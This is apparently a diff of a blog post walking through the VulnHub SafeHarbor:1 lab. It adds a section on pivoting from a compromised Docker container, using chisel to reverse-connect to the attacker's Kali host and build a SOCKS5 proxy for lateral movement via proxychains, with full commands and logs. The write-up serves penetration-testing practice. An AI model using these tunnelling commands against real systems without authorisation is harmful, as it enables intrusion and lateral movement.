@@ -1,5 +1,5 @@
 ---
-title: VulnHub Walkthrough SafeHarbor:1
+title: VulnHub Walkthrough SafeHarbor:1 
 published: true
 ---
 
@@ -243,7 +243,7 @@ This comes as no surprise, but verify first :-)
 
 Alright, let me simply do an arp scan to find the neighbours:
 
-```
+```sh
 arp -a
 harborbank_apache_v2_2.harborbank_backend (172.20.0.5) at 02:42:ac:14:00:05 [ether]  on eth0
 ? (172.20.0.1) at 02:42:f8:d6:41:d8 [ether]  on eth0
@@ -279,11 +279,9 @@ There are quite a lot of tools that comes to my mind for such a situation. Listi
 * [rpivot](https://github.com/klsecservices/rpivot)
 * [reGeorg](https://github.com/sensepost/reGeorg)
 
-Out of these I chose to go with [Chisel](https://github.com/jpillora/chisel#socks5-guide), mainly because of it's simplicity, written in golang and it can be cross-compiled. 
+Out of these I chose to go with [Chisel](https://github.com/jpillora/chisel#socks5-guide), mainly because of it's simplicity, written in golang and it can be cross-compiled. Also, there are other features that I am interested in.
 
-
-
-Let me illustrate again:
+Let me illustrate this here:
 
 ```
           | :22  <--->                 [HOST VM]                                    |
@@ -300,8 +298,6 @@ Outside   |                                                 reverse connect to 8
           |                                                                         |
 ```
 
-As explained in the help page of the tool, specify the remote server followed by the options; the remote port and destination host/port.
-
 ``
 "R:<remote-port>:<target-localhost>:<local-port>"
 ``
@@ -314,7 +310,7 @@ As explained in the help page of the tool, specify the remote server followed by
 
 ![chisel_command](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_4.png)
 
-**On the attacker machine run**
+**On the (Kali) attacker machine run**
 
 ```sh
 /chisel_linux_amd64 server -p 8888 -reverse 
@@ -325,6 +321,109 @@ As explained in the help page of the tool, specify the remote server followed by
 Now, let's go ahead and connect to MySQL and see what's in the database for us:
 
 ![mysql_connect](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_2.gif)
+
+
+I spent quite a lot of time reading the chisel manual page and when I checked the open issues for the project "reverse proxy" is a feature request. But unfortunately, the chisel client does not support socks5 server (I mean, makes sense it's a client?)
+
+What we did earlier was reverse connect the docker container to our attacker machine and tunnel traffic for a specific port. For us to expand our attack surface and laterally move I would need a socks proxy or something similiar.
+
+Reading through the open issues, a comment from one of the user shows a complicated way of making this happen, here's the link to the page: https://github.com/jpillora/chisel/issues/101
+
+**On the (Kali) attacker machine run:**
+
+```sh
+./chisel_linux_amd64 server -p 9000 --reverse -v
+```
+
+Instead of tmux, I decided to run the processes in background.
+
+**On the victim machine run:**
+
+```sh
+$ chisel client -v http://192.168.128.49:9000 R:127.0.0.1:14000:127.0.0.1:18000 &
+$ chisel server -p 62000 --host 127.0.0.1 --socks5 -v &
+$ chisel client -v http://127.0.0.1:62000 127.0.0.1:18000:socks &
+```
+
+Let me explain the sequence here:
+
+- [Docker container] reverse connects to [Kali VM] on port 9000
+- chisel client on [Docker container] traffic between [Kali VM] 14000 and [Docker container] 18000
+- chisel server on [Docker container] creates socks5 server on port 62000
+- chisel client on [Docker container] tunnels traffic between port 18000 and socks5 proxy listening on [Docker container] on 62000
+- This creates a socks5 proxy between [Kali VM] and [Docker container] R:127.0.0.1:1:14000=>127.0.0.1:18000 (R indicates remote)
+
+```
+[Docker container]--> reverse connect 9000:[Kali VM]:14000 <==> [Docker container] chisel-client 127.0.0.1:18000 ==> [Docker container] socks5 127.0.0.1:62000
+```
+
+```
+/home/www-data $ ./chisel client -v http://192.168.128.49:9000 R:127.0.0.1:14000:127.0.0.1:18000 &
+/home/www-data $ 2019/10/17 20:28:34 client: Connecting to ws://192.168.128.49:9000
+2019/10/17 20:28:34 client: Handshaking...
+2019/10/17 20:28:34 client: Fingerprint 4d:5f:fc:a1:37:2d:e9:9e:c4:4e:f9:99:19:5f:c4:8e
+2019/10/17 20:28:34 client: Sending config
+2019/10/17 20:28:34 client: Connected (Latency 810.6µs)
+
+/home/www-data $ ./chisel server -p 62000 --host 127.0.0.1 --socks5 -v &
+/home/www-data $ 2019/10/17 20:28:41 server: SOCKS5 server enabled
+2019/10/17 20:28:41 server: Fingerprint d4:d8:a4:b5:1e:7d:8b:ca:0f:4e:6d:09:5f:6d:4c:61
+2019/10/17 20:28:41 server: Listening on 127.0.0.1:62000...
+
+/home/www-data $ ./chisel client -v http://127.0.0.1:62000 127.0.0.1:18000:socks &
+/home/www-data $ 2019/10/17 20:28:47 client: Connecting to ws://127.0.0.1:62000
+2019/10/17 20:28:47 client: proxy#1:127.0.0.1:18000=>socks: Listening
+2019/10/17 20:28:47 server: session#1: Handshaking...
+2019/10/17 20:28:47 client: Handshaking...
+2019/10/17 20:28:48 client: Fingerprint d4:d8:a4:b5:1e:7d:8b:ca:0f:4e:6d:09:5f:6d:4c:61
+2019/10/17 20:28:48 server: session#1: Verifying configuration
+2019/10/17 20:28:48 client: Sending config
+2019/10/17 20:28:48 server: session#1: Open
+2019/10/17 20:28:48 client: Connected (Latency 1.321291ms)
+2019/10/17 20:29:39 client: conn#1: [1/1]: Open
+2019/10/17 20:29:39 client: proxy#1:127.0.0.1:18000=>socks: conn#1: Open
+2019/10/17 20:29:39 server: session#1: socksconn#1: {%!s(int32=1) %!s(int32=1)} Opening
+2019/10/17 20:29:39 client: proxy#1:127.0.0.1:18000=>socks: conn#1: Close (sent 88B received 2.32KB)
+```
+
+On the Kali machine you should see the connection established:
+
+```
+root@kali:/tmp# ./chisel_linux_amd64 server -p 9000 --reverse -v
+2019/10/17 16:25:26 server: Reverse tunnelling enabled
+2019/10/17 16:25:26 server: Fingerprint 4d:5f:fc:a1:37:2d:e9:9e:c4:4e:f9:99:19:5f:c4:8e
+2019/10/17 16:25:26 server: Listening on 0.0.0.0:9000...
+2019/10/17 16:28:34 server: session#1: Handshaking...
+2019/10/17 16:28:34 server: session#1: Verifying configuration
+2019/10/17 16:28:34 server: session#1: Open
+2019/10/17 16:28:34 server: proxy#1:R:127.0.0.1:14000=>127.0.0.1:18000: Listening
+2019/10/17 16:29:39 server: proxy#1:R:127.0.0.1:14000=>127.0.0.1:18000: conn#1: Open
+2019/10/17 16:29:39 server: proxy#1:R:127.0.0.1:14000=>127.0.0.1:18000: conn#1: Close (sent 88B received 2.32KB)
+2019/10/17 16:29:42 server: proxy#1:R:127.0.0.1:14000=>127.0.0.1:18000: conn#2: Open
+2019/10/17 16:29:42 server: proxy#1:R:127.0.0.1:14000=>127.0.0.1:18000: conn#2: Close (sent 88B received 1.75KB)
+```
+
+Phew! That was a bit complex but let's see if the socks proxy works. 
+
+```
+root@kali:~# netstat -antp | grep 14000
+tcp        0      0 127.0.0.1:14000         0.0.0.0:*               LISTEN      8203/./chisel_linux 
+```
+
+Port 14000 has opened up on my Kali machine, let me add it to the proxychains configuration file to use that as my socks5 proxy. If this works, I should be able to use proxychains to continue moving laterally.
+
+```
+root@kali:~# tail /etc/proxychains.conf
+#
+#       proxy types: http, socks4, socks5
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5 127.0.0.1 14000
+```
 
 
 
